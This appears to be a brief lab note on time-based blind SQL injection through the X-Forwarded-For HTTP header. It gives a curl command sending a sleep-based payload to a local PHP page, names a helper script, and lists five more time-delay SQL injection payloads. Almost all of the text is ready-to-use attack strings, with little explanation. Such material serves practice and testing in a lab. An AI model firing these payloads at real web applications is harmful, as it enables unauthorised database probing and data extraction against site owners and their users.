LAB2:   [HEADER] X-Forwarded-For SQLi Injection:

apt install time

time curl -s -H "X-Forwarded-For: '+(select*from(select(if(1=1,sleep(20),false)))a)+'" --url "http://localhost/forwarded.php"

Tool used: sql_headers-x-forwarded-for.py



"XOR(if(now()=sysdate(),sleep(20),0))OR"
' or sleep(20)#
0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
(select*from(select(sleep(20)))a)
'+(select*from(select(if(1=1,sleep(20),false)))a)+'